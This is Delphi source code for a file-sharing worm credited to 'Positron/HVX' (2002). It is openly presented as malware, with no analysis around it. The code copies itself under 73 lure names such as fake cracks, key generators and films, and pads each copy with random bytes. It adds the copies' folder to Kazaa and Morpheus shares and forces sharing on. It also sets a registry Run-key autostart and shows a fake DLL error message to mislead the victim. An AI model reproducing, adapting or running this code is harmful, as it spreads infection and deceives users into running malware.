   //****************************************************************************//
   //      Virus:      Worm.P2P.Sytro.d                                          //
   //      Writer:     Positron/HVX                                              //
   //      Finished:   July/2002                                                 //
   //****************************************************************************//

   UNIT Worm;

   INTERFACE

   USES
     Windows, SysUtils, Forms, Registry;

   TYPE
     TForm1 = CLASS(TForm)
     PROCEDURE FormCreate(Sender: TObject);
     PRIVATE
       { Private declarations }
     PUBLIC
       { Public declarations }
     END;

   VAR
     Form1    : TForm1;
     Reg      : TRegistry;
     I        : Longint;
     S        : String;

   CONST FakeFileNumber : byte = 73;

         AutostartFile : String = 'execfg4'; //<- Ide nem kell a .exe

         FakeFiles : ARRAY[1..73] OF STRING = (
                             'Star Wars Episode 2 - Attack Of The Clones Full Downloader.exe',
                             'Jenna Jameson - Built For Speed Downloader.exe',
                             '[DiVX] Lord of The Rings Full Downloader.exe',
                             '[DiVX] Harry Potter And The Sorcerors Stone Full Downloader.exe',
                             'CKY3 - Bam Margera World Industries Alien Workshop Full Downloader.exe',
                             'Cat Attacks Child Full Downloader.exe',
                             'PS1 Boot Disc Full Dwonloader.exe',
                             'Sony Play station boot disc - Downloader.exe',
                             'How To Hack Websites.exe',
                             'AIM Account Stealer Downloader.exe',
                             'MSN Password Hacker and Stealer.exe',
                             'Hacking Tool Collection.exe',
                             'Windows XP Full Downloader.exe',
                             'Macromedia Flash 5.0 Full Downloader.exe',
                             'DSL Modem Uncapper.exe',
                             'Internet and Computer Speed Booster.exe',
                             'ZoneAlarm Firewall Full Downloader.exe',
                             'Borland Delphi 6 Key Generator.exe',
                             'ScaryMovie 2 Full Downloader.exe',
                             'StarWars2 - CloneAttack - FullDownloader.exe',
                             'Spiderman FullDownloader.exe',
                             'Shakira FullDownloader.exe',
                             'Gladiator FullDownloader.exe',
                             'AikaQuest3Hentai FullDownloader.exe',
                             'MoviezChannelsInstaler.exe',
                             'Zidane-ScreenInstaler.exe',
                             'LordOfTheRings-FullDownloader.exe',
                             'SIMS FullDownloader.exe',
                             'Britney spears nude.exe',
                             'Quake 4 BETA.exe',
                             'Windows XP key generator.exe',
                             'Windows XP serial generator.exe',
                             'Xbox.info.exe',
                             'DivX.exe',
                             'GTA3 crack.exe',
                             'Battle.net key generator (WORKS!!).exe',
                             'Warcraft 3 battle.net serial generator.exe',
                             'Half-life WON key generator.exe',
                             'Star wars episode 2 downloader.exe',
                             'Winzip 8.0 + serial.exe',
                             'Winrar + crack.exe',
                             'Key generator for all windows XP versions.exe',
                             'Warcraft 3 ONLINE key generator.exe',
                             'Half-life ONLINE key generator.exe',
                             'Grand theft auto 3 CD1 crack.exe',
                             'Macromedia key generator (all products).exe',
                             'KaZaA media desktop v2.0 UNOFFICIAL.exe',
                             'Microsoft key generator, works for ALL microsoft products!!.exe',
                             'Microsoft Windows XP crack pack.exe',
                             'Hack into any computer!!.exe',
                             'DivX codec v6.0.exe',
                             'DivX newest version.exe',
                             'DivX pro key generator.exe',
                             'Key generator for over 1,000 applications (really!).exe',
                             'DivX patch - Increases quality.exe',
                             'KaZaA spyware remover.exe',
                             'Age of empires 2 crack.exe',
                             'Norton antivirus 2002.exe',
                             'Macromedia dreamweaver MX (crack).exe',
                             'Microsoft Office XP (english) key generator.exe',
                             'Microsoft Office XP iso Full Downloader.exe',
                             'CloneCD + crack.exe',
                             'CloneCD all-versions key generator.exe',
                             'The Neverending Story Part I Full Downloader.exe',
                             'Warcraft III Full Downloader.exe',
                             'VS2000 Full Downloader.exe',
                             'The Sun Of All Fears Full Downloader.exe',
                             'Crazy Taxi Full Downloader.exe',
                             'Duke Nukem Manhattan Project Full Downloader.exe',
                             'Industry Giant II Full Downloader.exe',
                             'F1 Grand Pix 4 Full Downloader.exe',
                             'Star Wars II Movie Full Downloader.exe',
                             'Nero Burning Rom 5.5.9.3 Full Downloader.exe');


   IMPLEMENTATION

   {$R *.DFM}

   FUNCTION CopyFile(CONST SourceFile:TFilename;CONST DestinationFile:TFilename):  BOOLEAN;
   BEGIN
     RESULT := Windows.CopyFile(pChar(SourceFile),pChar(DestinationFile),False);
   END;

   FUNCTION WinPath : STRING;
   VAR
     PWindowsDir: ARRAY [0..255] OF Char;
   BEGIN
     GetWindowsDirectory(PWindowsDir,255);
     Result:=StrPas(PWindowsDir)+'\';
   END;

   PROCEDURE ManipulateFileSize;
   VAR FakeFile : FILE;
       RandomBytes : ARRAY[0..50000] OF Byte;
   BEGIN
     Randomize;
     FOR i:=1 TO 50000 DO RandomBytes[i]:=Random(255);
     FOR i:=1 TO FakeFileNumber DO BEGIN
       S:=WinPath+'SysConfig\'+FakeFiles[i];
       IF FileExists(S) THEN BEGIN
         Assign(FakeFile,S);
         Reset(FakeFile,1);
         Seek(FakeFile,filesize(FakeFile));
         BlockWrite(FakeFile,RandomBytes[0],Random(50000));
         Close(FakeFile);
       END;
     END;
   END;

   FUNCTION FindMorpheus : Boolean;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Result:=Reg.KeyExists('\Software\Morpheus\LocalContent');
     Reg.CloseKey;
   END;

   FUNCTION FindKazaa : Boolean;
   BEGIN
     Reg.RootKey:=HKEY_CURRENT_USER;
     Result:=Reg.KeyExists('\Software\Kazaa\LocalContent');
     Reg.CloseKey;
   END;

   PROCEDURE MakeFakeFiles;
   BEGIN
     CreateDir(WinPath+'SysConfig');
     FOR i:=1 TO FakeFileNumber DO Windows.CopyFile(pChar(ParamStr(0)),pChar(WinPath+'SysConfig\'+FakeFiles[i]),False);
     ManipulateFileSize;
   END;

   PROCEDURE VRegistry;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run', True);
     if Reg.ReadString(AutostartFile)='' THEN Reg.WriteString(AutostartFile,WinPath+AutostartFile+'.exe');
     Reg.CloseKey;
   END;

   PROCEDURE MorpheusShare;
   VAR
     ConfigFile      : Text;
     ConfigStrings   : ARRAY[0..500] OF STRING;
     ConfigFileLines : Word;
     LastDirString   : Word;
     DirStringNum    : Word;
     UploadLine      : Word;
     Double          : Boolean;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey('\Software\Morpheus\LocalContent',False);
     s:=Reg.ReadString('InstallDir');
     s:=s+'\GnuConfig.ini';
     Assign(ConfigFile,s);
     reset(ConfigFile);
     ConfigFileLines:=0;
     DirStringNum:=0;
     REPEAT
       inc(ConfigFileLines);
       ReadLn(ConfigFile,ConfigStrings[ConfigFileLines]);
       IF Pos('Dir',ConfigStrings[ConfigFileLines])>0 THEN BEGIN
         LastDirString:=ConfigFileLines;
         Inc(DirStringNum);
       END;
       IF Pos('SysConfig',ConfigStrings[ConfigFileLines])>0 THEN Double:=True;
       IF Pos('MaxUploads=',ConfigStrings[ConfigFileLines])>0 THEN configstrings[configfilelines]:='MaxUploads=3';
     UNTIL EOF(ConfigFile);
     Close(ConfigFile);

     ReWrite(ConfigFile);
     if not double then begin
       FOR i:=1 TO LastDirString DO if (pos('Word',ConfigStrings[i])<>1)and(pos('[Search Screen]',ConfigStrings[i])=0) then WriteLn(ConfigFile,ConfigStrings[i]);
       Str(DirStringNum-1,s);
       WriteLn(ConfigFile,'Dir'+s+'='+Winpath+'SysConfig, Recursive');
       FOR i:=LastDirString+1 TO ConfigFileLines DO {if pos('Word',ConfigStrings[i])<>1 then} writeln(ConfigFile,ConfigStrings[i]);
     end else begin
       for i:=1 to configfilelines do if (pos('Word',ConfigStrings[i])<>1)and(pos('[Search Screen]',ConfigStrings[i])=0) then WriteLn(ConfigFile,ConfigStrings[i]);
     end;
       Close(ConfigFile);

     Reg.CloseKey;
   END;

   PROCEDURE KazaRegistry;
   BEGIN
     Reg.RootKey:=HKEY_CURRENT_USER;
     Reg.OpenKey('\Software\Kazaa\LocalContent',False);
     REPEAT
       Str(i,s);
       s:='Dir'+s;
       Inc(i);
     UNTIL Reg.ReadString(s)='';
     Reg.WriteString(s,'012345:'+WinPath+'SysConfig');    // <- Create Dir to Fake Files
     Reg.WriteInteger('DisableSharing',0);                // <- Enable File Sharing
     Reg.CloseKey;
   END;

   FUNCTION FirstRun: boolean;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     result:= NOT Reg.Keyexists('\Software\Positron4');
     IF result THEN Reg.CreateKey('\Software\Positron4');
     Reg.CloseKey;
   END;

   PROCEDURE TForm1.FormCreate(Sender: TObject);
   var e : boolean;
   BEGIN
     Reg := TRegistry.Create;
     e:=FirstRun;
   //Install Kazaa
     if findkazaa then begin
       IF e THEN BEGIN
         KazaRegistry;
         VRegistry;
       END;
     end;
   //Install Morpheus
     IF FindMorpheus THEN BEGIN
       IF e THEN VRegistry;
       MorpheusShare;
     END;

     If (findmorpheus)or(findkazaa) then MakeFakeFiles;
     if e then begin
       Application.MessageBox('QTINTFT.DLL Not Found!','Error',MB_ICONHAND);
       CopyFile (pChar(ParamStr(0)),pChar(Winpath+AutostartFile+'.exe'));
     end;
     Reg.Free;
     Form1.Close;
     Halt;
     s:='*******        Worm.P2P.Sytro.d    *******';
     s:='This Worm Infect Both Kazaa and Morpheus Software';
     s:='www.kazaa.com';
     s:='www.morpheus.com';
     s:='Author: Positron';
     s:='Thanks to Slage';
   END;
   END.
